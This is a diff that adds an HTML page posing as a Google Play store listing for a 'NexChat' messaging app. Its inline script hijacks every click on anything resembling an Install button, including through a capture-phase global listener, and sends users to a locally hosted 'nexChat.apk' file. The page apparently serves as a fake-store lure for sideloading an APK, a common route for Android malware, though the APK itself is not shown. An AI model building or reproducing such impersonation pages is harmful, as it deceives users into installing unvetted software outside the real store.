@@ -1,0 +1,121 @@
+<!doctype html>
+<html lang="en">
+  
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="favicon.svg" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>NexChat - Messaging App - Apps on Google Play</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&amp;family=Roboto:wght@300;400;500;700&amp;display=swap" rel="stylesheet">
+    <script type="module" crossorigin src="assets/index-ChF2PM-i.js"></script>
+    <link rel="stylesheet" crossorigin href="assets/index-Cf-T5Y3u.css">
+  </head>
+  <body>
+    <div id="root"></div>
+
+    <!-- APK download fallback (works even if the app JS doesn't wire the install button correctly) -->
+    <script>
+      (function () {
+        const APK_URL = './nexChat.apk';
+
+        function looksLikeInstallCTA(el) {
+          if (!el) return false;
+          const aria = (el.getAttribute && (el.getAttribute('aria-label') || el.getAttribute('title') || '') || '').toLowerCase();
+          const txt = (el.innerText || '').toLowerCase();
+          const cls = (el.className || '').toString().toLowerCase();
+
+          return (
+            txt.includes('install') ||
+            aria.includes('install') ||
+            cls.includes('install') ||
+            (el.classList && el.classList.contains('install-btn'))
+          );
+        }
+
+        function wireInstallIfPresent() {
+          const candidates = [
+            '[data-apk="nexChat"]',
+            '[data-testid="install"]',
+            '[aria-label="Install"]',
+            '.install-btn',
+            'button.install-btn',
+            'a.install-btn',
+            'a[href$=".apk"]',
+            'a[href*="nexChat.apk"]',
+            'a[href="./nexChat.apk"]',
+            'button[aria-label="Install" i]',
+            'button[title="Install" i]'
+          ];
+
+          let el = null;
+          for (const sel of candidates) {
+            el = document.querySelector(sel);
+            if (el) break;
+          }
+
+          if (!el) return false;
+
+          // Anchor: ensure it points to the APK.
+          if (el.tagName && el.tagName.toLowerCase() === 'a') {
+            el.setAttribute('href', APK_URL);
+            el.setAttribute('download', 'nexChat.apk');
+            return true;
+          }
+
+          // Button: redirect on click.
+          if (!el.__nexchatInstallWired) {
+            el.__nexchatInstallWired = true;
+            el.addEventListener(
+              'click',
+              function (e) {
+                e.preventDefault();
+                e.stopPropagation();
+                window.location.href = APK_URL;
+              },
+              { capture: true }
+            );
+          }
+
+          return true;
+        }
+
+        // Global click fallback: handles cases where the clickable area is an icon/span.
+        document.addEventListener(
+          'click',
+          function (e) {
+            const target = e.target;
+            if (!target || !target.closest) return;
+
+            const clickable = target.closest('a,button');
+            if (!clickable) return;
+
+            if (!looksLikeInstallCTA(clickable)) return;
+
+            e.preventDefault();
+            e.stopPropagation();
+            window.location.href = APK_URL;
+          },
+          { capture: true }
+        );
+
+        // Try immediately.
+        if (document.readyState !== 'loading') {
+          wireInstallIfPresent();
+        } else {
+          document.addEventListener('DOMContentLoaded', wireInstallIfPresent);
+        }
+
+        // React mounts after initial load; observe for late render.
+        const mo = new MutationObserver(function () {
+          if (wireInstallIfPresent()) mo.disconnect();
+        });
+        mo.observe(document.documentElement, { childList: true, subtree: true });
+      })();
+    </script>
+  </body>
+
+</html>
+
